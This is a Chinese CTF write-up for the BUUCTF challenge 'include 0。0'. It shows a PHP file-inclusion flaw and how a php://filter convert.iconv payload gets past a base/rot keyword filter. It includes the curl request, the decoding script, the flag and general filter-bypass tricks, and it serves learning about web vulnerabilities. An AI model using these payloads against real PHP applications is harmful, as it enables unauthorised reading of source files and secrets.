---
title: "[NewStarCTF 2023 公开赛道]include 0。0"
platform: BUUCTF
category: Web
difficulty: 入门
tags: [php, file-inclusion, php-filter, iconv]
vulnerability: PHP 文件包含漏洞，通过 php://filter 伪协议绕过 base/rot 过滤读取源码
solved: true
flag: "flag{19687f2d-fc81-4420-8fbf-3f2330915528}"
---

# [NewStarCTF 2023 公开赛道]include 0。0

## 题目概述
PHP 文件包含题目，提示 flag 在 flag.php 中，需要通过文件包含漏洞读取源码。

## 信息收集
访问页面获取源码：
```php
<?php
highlight_file(__FILE__);
// FLAG in the flag.php
$file = $_GET['file'];
if(isset($file) && !preg_match('/base|rot/i',$file)){
    @include($file);
}else{
    die("nope");
}
?>
```

## 漏洞分析（漏洞类型、原理、判断过程）
- **漏洞类型**：PHP 文件包含漏洞
- **过滤分析**：正则 `/base|rot/i` 过滤了 `base` 和 `rot` 关键字，阻止了常用的 `php://filter/convert.base64-encode` 和 `php://filter/read=rot13` 等编码方式
- **绕过思路**：PHP filter 支持多种编码转换器，`convert.iconv` 可以使用字符集转换，不包含被过滤的关键字

## 利用过程（Payload + Flag）

**Payload**：
```
?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
```

**请求**：
```bash
curl -s "http://target/?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php"
```

**返回**（UCS-2 编码后的内容）：
```
?<hp p//lfga1{69782f-dcf184-24-0f8fb3-2f33905125}8
```

**解码**（UCS-2LE.UCS-2BE 是每2字节交换位置，再次交换即可还原）：
```python
encoded = "?<hp p//lfga1{69782f-dcf184-24-0f8fb3-2f33905125}8"
result = ""
for i in range(0, len(encoded)-1, 2):
    result += encoded[i+1] + encoded[i]
print(result)
# 输出: <?php //flag{19687f2d-fc81-4420-8fbf-3f2330915528}
```

**Flag**：`flag{19687f2d-fc81-4420-8fbf-3f2330915528}`

## 复现步骤
1. 访问题目页面，获取 PHP 源码
2. 分析过滤规则：禁止 `base` 和 `rot` 关键字
3. 使用 `php://filter/convert.iconv.UCS-2LE.UCS-2BE` 绕过过滤
4. 对返回的编码内容进行 UCS-2 字节序解码，获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| PHP 文件包含 | `$_GET['file']` 参数 | `php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php` | php://filter 伪协议、iconv 编码绕过 |

## 知识总结（解题技巧、同类题型套路）

1. **PHP Filter 绕过技巧**：
   - 常用 `convert.base64-encode` 被过滤时，可使用 `convert.iconv.*` 编码器
   - UCS-2LE/UCS-2BE、UCS-4LE/UCS-4BE 会交换字节序，造成内容"加密"效果
   - 解码只需再次应用相同的编码或手动交换字节

2. **同类题型套路**：
   - 遇到 `base` 过滤 → 尝试 `iconv` 编码
   - 遇到 `rot` 过滤 → 尝试其他 string 过滤器或 iconv
   - 多种编码可链式组合：`convert.iconv.A.B|convert.iconv.B.A`
